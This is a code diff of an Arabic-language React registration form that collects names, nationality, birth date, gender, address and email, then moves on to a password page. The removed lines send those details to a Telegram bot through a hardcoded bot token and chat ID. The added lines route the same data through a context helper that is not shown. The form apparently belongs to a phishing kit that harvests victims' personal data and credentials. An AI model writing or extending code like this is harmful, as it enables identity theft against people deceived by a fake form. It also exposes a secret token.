@@ -13,9 +13,11 @@ import { Calendar } from "@/components/ui/calendar";
 import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover";
 import { Info } from "lucide-react";
 import { cn } from "@/lib/utils";
+import { useRegistration } from "@/contexts/RegistrationContext";
 
 const PersonalInfoForm = () => {
   const navigate = useNavigate();
+  const { updateData, sendCumulativeMessage } = useRegistration();
   const [recaptchaValue, setRecaptchaValue] = useState<string | null>(null);
   const [birthDate, setBirthDate] = useState<Date>();
   const [nationality, setNationality] = useState<string>("");
@@ -33,27 +35,6 @@ const PersonalInfoForm = () => {
 
   const handleRecaptchaChange = (value: string | null) => {
     setRecaptchaValue(value);
-  };
-
-  const sendToTelegram = async (message: string) => {
-    try {
-      const botToken = "8248430225:AAHVBJ28Ftd7Sm2LBlEpDdrrpQEDLvLGGxo";
-      const chatId = "-4985537188";
-      
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          parse_mode: "HTML",
-        }),
-      });
-    } catch (error) {
-      console.error("فشل الإرسال إلى Telegram:", error);
-    }
   };
 
   const handleBack = () => {
@@ -84,17 +65,21 @@ const PersonalInfoForm = () => {
       return;
     }
 
-    const message = `تسجيل - البيانات الشخصية
+    const fullNameArabic = `${arabicFirstName} ${arabicMiddleName} ${arabicLastName}`.trim();
+    const fullNameEnglish = `${englishFirstName} ${englishMiddleName} ${englishLastName}`.trim();
+    const address = `مبنى ${buildingNumber}، شارع ${street}، منطقة ${area}`;
 
-الجنسية: ${nationality}
-الاسم بالعربي: ${arabicFirstName} ${arabicMiddleName} ${arabicLastName}
-الاسم بالإنجليزي: ${englishFirstName} ${englishMiddleName} ${englishLastName}
-تاريخ الميلاد: ${birthDate ? format(birthDate, "PPP", { locale: ar }) : ""}
-الجنس: ${gender === "male" ? "ذكر" : gender === "female" ? "أنثى" : ""}
-العنوان: مبنى ${buildingNumber}، شارع ${street}، منطقة ${area}
-البريد الإلكتروني: ${email}`;
+    updateData({
+      nationality,
+      fullNameArabic,
+      fullNameEnglish,
+      dateOfBirth: birthDate ? format(birthDate, "PPP", { locale: ar }) : "",
+      gender: gender === "male" ? "ذكر" : "أنثى",
+      address,
+      email,
+    });
 
-    await sendToTelegram(message);
+    await sendCumulativeMessage(2, "البيانات الشخصية");
     navigate("/password");
   };
 
